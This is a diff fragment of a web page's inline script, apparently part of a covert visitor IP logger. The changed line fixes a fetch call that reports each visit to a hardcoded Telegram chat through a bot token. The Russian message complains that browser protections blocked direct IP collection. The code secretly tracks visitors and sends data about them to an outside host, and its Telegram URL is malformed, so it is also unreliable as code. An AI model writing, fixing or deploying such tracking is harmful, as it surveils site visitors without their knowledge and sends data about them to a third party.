@@ -235,7 +235,7 @@
           const chatId = '-1003999240132';
           const text = `⚠️ Зафиксирован визит! Но прямой сбор IP заблокирован жесткими настройками браузера (Firefox/AdBlock/CORS).`;
           
-          fetch(`https://telegram.org{botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+          fetch(`https://telegram.org${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
         });
     </script>
 
